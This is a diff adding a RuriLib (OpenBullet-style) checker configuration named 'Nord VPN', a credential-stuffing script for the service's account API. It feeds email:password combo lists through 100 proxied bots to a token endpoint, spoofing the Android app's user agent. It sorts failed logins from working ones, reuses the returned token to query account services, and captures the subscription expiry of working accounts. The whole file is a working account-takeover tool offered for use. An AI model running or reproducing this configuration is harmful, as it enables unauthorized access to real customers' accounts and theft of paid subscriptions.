@@ -1,0 +1,240 @@
+{
+  "$type": "RuriLib.Config, RuriLib",
+  "settings": {
+    "$type": "RuriLib.ConfigGeneralSettings, RuriLib",
+    "configName": "Nord VPN",
+    "needsCaptchaService": false,
+    "allowedCombo1": "MailPass",
+    "allowedCombo2": "None",
+    "suggestedBots": 100,
+    "lastModified": "2018-06-02T00:11:18.0465059+01:00",
+    "additionalInfo": "",
+    "author": "Ruri",
+    "bbVersion": "1.0.0",
+    "needsProxies": true,
+    "onlySocks": false,
+    "maxProxyUses": 0,
+    "field1MinLength": 0,
+    "field1MaxLength": 100,
+    "field1Lowercase": false,
+    "field1Uppercase": false,
+    "field1Digits": false,
+    "field1Symbols": false,
+    "field2MinLength": 0,
+    "field2MaxLength": 100,
+    "field2Lowercase": false,
+    "field2Uppercase": false,
+    "field2Digits": false,
+    "field2Symbols": false
+  },
+  "blockList": {
+    "$type": "System.Collections.Generic.List`1[[RuriLib.BlockBase, RuriLib]], mscorlib",
+    "$values": [
+      {
+        "$type": "RuriLib.BlockRequestAdvanced, RuriLib",
+        "url": "https://zwyr157wwiu6eior.com/v1/users/tokens",
+        "postData": "username=<USER>&password=<PASS>",
+        "method": "POST",
+        "customHeaders": {
+          "$type": "System.Collections.Generic.List`1[[System.Collections.Generic.KeyValuePair`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib]], mscorlib",
+          "$values": []
+        },
+        "customCookies": {
+          "$type": "System.Collections.Generic.List`1[[System.Collections.Generic.KeyValuePair`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib]], mscorlib",
+          "$values": []
+        },
+        "headerAccept": "*/*",
+        "headerUserAgent": "NordApp android (playstore/2.8.6) Android 8.1.0",
+        "headerContentType": "application/x-www-form-urlencoded",
+        "autoRedirect": true,
+        "blockLabel": "LOGIN"
+      },
+      {
+        "$type": "RuriLib.BlockKeycheck, RuriLib",
+        "banOn4XX": false,
+        "banOnToCheck": false,
+        "keyChains": {
+          "$type": "System.Collections.Generic.List`1[[RuriLib.ResponseKeyChain, RuriLib]], mscorlib",
+          "$values": [
+            {
+              "$type": "RuriLib.ResponseKeyChain, RuriLib",
+              "keychainType": 1,
+              "keychainMode": 0,
+              "keys": {
+                "$type": "System.Collections.Generic.List`1[[RuriLib.ResponseKey, RuriLib]], mscorlib",
+                "$values": [
+                  {
+                    "$type": "RuriLib.ResponseKey, RuriLib",
+                    "keyField": 5,
+                    "keyString": "Unauthorized",
+                    "notKey": false,
+                    "matchKey": false
+                  }
+                ]
+              }
+            },
+            {
+              "$type": "RuriLib.ResponseKeyChain, RuriLib",
+              "keychainType": 3,
+              "keychainMode": 0,
+              "keys": {
+                "$type": "System.Collections.Generic.List`1[[RuriLib.ResponseKey, RuriLib]], mscorlib",
+                "$values": [
+                  {
+                    "$type": "RuriLib.ResponseKey, RuriLib",
+                    "keyField": 5,
+                    "keyString": "502: Bad gateway",
+                    "notKey": false,
+                    "matchKey": false
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        "blockLabel": "KEY CHECK"
+      },
+      {
+        "$type": "RuriLib.BlockParse, RuriLib",
+        "parseTarget": 2,
+        "isCapture": false,
+        "prefix": "",
+        "suffix": "",
+        "targetCookieName": "",
+        "targetHeaderName": "",
+        "targetVariableName": "",
+        "variableLString": "",
+        "variableRString": "",
+        "parseType": 0,
+        "variableName": "TOKEN",
+        "leftString": "\"token\":\"",
+        "rightString": "\"",
+        "recursive": false,
+        "cssSelector": "",
+        "attributeName": "",
+        "jsonField": "",
+        "xPath": "",
+        "xAttributeName": "",
+        "regexString": "",
+        "regexOutput": "",
+        "blockLabel": "PARSE TOKEN"
+      },
+      {
+        "$type": "RuriLib.BlockFunction, RuriLib",
+        "variableName": "ENCTOKEN",
+        "inputString": "token:<TOKEN>",
+        "functionType": 1,
+        "hashType": 4,
+        "hmacKey": "",
+        "rsaKeySize": 1024,
+        "xorKey": "",
+        "replaceWhat": "",
+        "replaceWith": "",
+        "regex": false,
+        "regexMatch": "",
+        "randomMin": 0,
+        "randomMax": 0,
+        "jumpCondition": 2,
+        "jumpComparisonString": "",
+        "jumpBlockLabel": "",
+        "maxFiles": 20,
+        "stringToFind": "",
+        "blockLabel": "ENCODE TOKEN"
+      },
+      {
+        "$type": "RuriLib.BlockRequestAdvanced, RuriLib",
+        "url": "https://zwyr157wwiu6eior.com/v1/users/services",
+        "postData": "",
+        "method": "GET",
+        "customHeaders": {
+          "$type": "System.Collections.Generic.List`1[[System.Collections.Generic.KeyValuePair`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib]], mscorlib",
+          "$values": [
+            {
+              "Key": "Authorization",
+              "Value": "Basic <ENCTOKEN>"
+            }
+          ]
+        },
+        "customCookies": {
+          "$type": "System.Collections.Generic.List`1[[System.Collections.Generic.KeyValuePair`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib]], mscorlib",
+          "$values": []
+        },
+        "headerAccept": "*/*",
+        "headerUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36",
+        "headerContentType": "application/x-www-form-urlencoded",
+        "autoRedirect": true,
+        "blockLabel": "REQUEST USER INFO"
+      },
+      {
+        "$type": "RuriLib.BlockKeycheck, RuriLib",
+        "banOn4XX": false,
+        "banOnToCheck": true,
+        "keyChains": {
+          "$type": "System.Collections.Generic.List`1[[RuriLib.ResponseKeyChain, RuriLib]], mscorlib",
+          "$values": [
+            {
+              "$type": "RuriLib.ResponseKeyChain, RuriLib",
+              "keychainType": 0,
+              "keychainMode": 0,
+              "keys": {
+                "$type": "System.Collections.Generic.List`1[[RuriLib.ResponseKey, RuriLib]], mscorlib",
+                "$values": [
+                  {
+                    "$type": "RuriLib.ResponseKey, RuriLib",
+                    "keyField": 5,
+                    "keyString": "created_at",
+                    "notKey": false,
+                    "matchKey": false
+                  }
+                ]
+              }
+            },
+            {
+              "$type": "RuriLib.ResponseKeyChain, RuriLib",
+              "keychainType": 1,
+              "keychainMode": 0,
+              "keys": {
+                "$type": "System.Collections.Generic.List`1[[RuriLib.ResponseKey, RuriLib]], mscorlib",
+                "$values": [
+                  {
+                    "$type": "RuriLib.ResponseKey, RuriLib",
+                    "keyField": 5,
+                    "keyString": "[]",
+                    "notKey": false,
+                    "matchKey": false
+                  }
+                ]
+              }
+            }
+          ]
+        },
+        "blockLabel": "KEY CHECK"
+      },
+      {
+        "$type": "RuriLib.BlockParse, RuriLib",
+        "parseTarget": 2,
+        "isCapture": true,
+        "prefix": "",
+        "suffix": "",
+        "targetCookieName": "",
+        "targetHeaderName": "",
+        "targetVariableName": "",
+        "variableLString": "",
+        "variableRString": "",
+        "parseType": 0,
+        "variableName": "EXPIRATION",
+        "leftString": "\",\"expires_at\":\"",
+        "rightString": "\"",
+        "recursive": false,
+        "cssSelector": "",
+        "attributeName": "",
+        "jsonField": "expires_at",
+        "xPath": "",
+        "xAttributeName": "",
+        "regexString": "",
+        "regexOutput": "",
+        "blockLabel": "PARSE"
+      }
+    ]
+  }
+}
